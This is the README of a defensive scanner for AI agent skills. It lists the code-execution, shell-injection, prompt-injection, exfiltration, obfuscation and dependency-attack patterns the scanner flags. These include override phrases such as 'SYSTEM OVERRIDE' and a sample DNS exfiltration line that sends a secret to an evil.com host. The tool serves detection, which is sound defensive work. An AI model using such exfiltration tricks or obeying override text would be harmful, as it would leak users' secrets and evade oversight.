# ISNAD Skill Scanner

Security scanner for AI agent skills. Detects code injection, prompt injection, credential exfiltration, evasion techniques, and malicious dependencies.

**Version:** 0.2.0  
**Patterns:** 69 (45 DANGER, 20 WARN, 4 INFO)

## Installation

```bash
cd isnad/scanner
uv pip install -e .
```

Or run directly:

```bash
uv run python -m isnad_scan.cli <path>
```

## Usage

```bash
# Scan a skill directory
isnad-scan ./skills/some-skill/

# JSON output (for CI/programmatic use)
isnad-scan ./skill --json

# Verbose (include INFO-level findings)
isnad-scan ./skill --verbose

# Show content hash (for caching/comparison)
isnad-scan ./skill --hash

# Quiet mode (just trust level)
isnad-scan ./skill --quiet
```

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | SAFE - no issues found |
| 1 | CAUTION/WARN - review recommended |
| 2 | DANGER - security issues detected |
| 3 | ERROR - scanner error |

## What It Detects

### DANGER (45 patterns)

**Code Execution:**
- `eval()`, `exec()`, `compile()` usage
- `getattr(__builtins__, 'eval')` evasion
- String concatenation building dangerous calls (`"ev"+"al"`)
- `chr()` concatenation obfuscation
- `new Function()` in JavaScript
- Lambda with dangerous functions

**Shell Injection:**
- `subprocess` with `shell=True`
- `os.system()`, `os.popen()`
- `child_process.exec()` in Node.js
- Backtick command substitution

**Prompt Injection:**
- Hidden instructions in HTML comments
- "SYSTEM OVERRIDE" / "ignore security" patterns
- Instructions to suppress reporting

**Data Exfiltration:**
- Credential variables sent to network
- DNS exfiltration (`socket.gethostbyname(secret + ".evil.com")`)
- Tor hidden service URLs

**Obfuscation:**
- Base64 decoding, ROT13, hex strings
- `bytes.fromhex()`, Unicode escapes
- Unicode homoglyph evasion (ℯval vs eval)

**Path Traversal & Symlinks:**
- `../../` patterns in code
- Symlinks escaping skill directory

**Dangerous Deserialization:**
- `pickle.load()`, `marshal.load()`
- Unsafe YAML loading

**Dependency Attacks:**
- Typosquatted packages (reqeusts, crytpography, etc.)
- Suspicious git dependencies
- Known malicious package names

### WARN (20 patterns)
- Network requests (verify destinations)
- File write/delete operations
- Environment variable access
- Dynamic imports
- Crypto library usage

### INFO (4 patterns)
- Subprocess with list args
- File reads
- Logging statements

## Context Awareness

The scanner is context-aware:
- Patterns in **documentation** (markdown, comments explaining attacks) are downgraded to INFO
- Patterns in **code blocks** within markdown are handled appropriately
- **String literals** containing pattern names (e.g., dict keys) don't trigger false positives

## Example

```
$ isnad-scan ./evasion-skill/

╭─── ISNAD Scan: ./evasion-skill ───╮
│ Trust Level: 🚨 DANGER            │
╰───────────────────────────────────╯

📁 Files scanned: 3
🚨 DANGER findings: 18

[DANGER] evasion.py:10 — getattr_dangerous
    Dynamic access to dangerous function via getattr

[DANGER] evasion.py:5 — string_concat_evasion
    String concatenation building eval/exec - evasion attempt

[DANGER] SKILL.md:5 — prompt_injection_html
    Potential prompt injection - attempts to override security

[DANGER] requirements.txt:6 — dangerous_package
    Potentially dangerous or typosquatted package: reqeusts
```

## Limitations

What the scanner **cannot** catch (yet):
- AST-level evasion (import aliasing, nested dynamic calls)
- Minified/bundled JavaScript
- Binary files with embedded scripts
- Packages with known CVEs (needs OSV integration)
- Actual malicious intent vs. legitimate security tools

## Roadmap

- [x] Pattern-based scanning (69 patterns)
- [x] Dependency scanning (typosquats, suspicious sources)
- [x] Symlink safety checks
- [x] Context awareness (docs vs code)
- [x] Prompt injection detection
- [ ] AST parsing for Python/JS
- [ ] CVE database integration (OSV/Snyk)
- [ ] URL scanning (download remote skills)
- [ ] ISNAD Registry integration (inscribe attestations)
- [ ] ClawHub pre-install hook
